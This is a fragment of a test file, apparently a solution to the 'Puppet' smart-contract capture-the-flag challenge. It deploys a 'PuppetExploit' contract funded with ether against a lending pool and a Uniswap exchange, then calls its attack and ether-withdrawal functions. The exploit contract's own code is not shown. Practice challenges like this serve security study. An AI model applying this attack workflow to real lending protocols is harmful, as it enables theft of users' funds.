...
describe('[Challenge] Puppet', function () {
    ...
    it('Execution', async function () {
        ...
        const Exploit = await (await ethers.getContractFactory('PuppetExploit', deployer)).deploy(token.address,lendingPool.address,uniswapExchange.address,{value: ethers.utils.parseEther("23")});
        await token.connect(player).transfer(Exploit.address,PLAYER_INITIAL_TOKEN_BALANCE)
        await Exploit.attack(PLAYER_INITIAL_TOKEN_BALANCE, player.address);
        await Exploit.returnether(player.address);
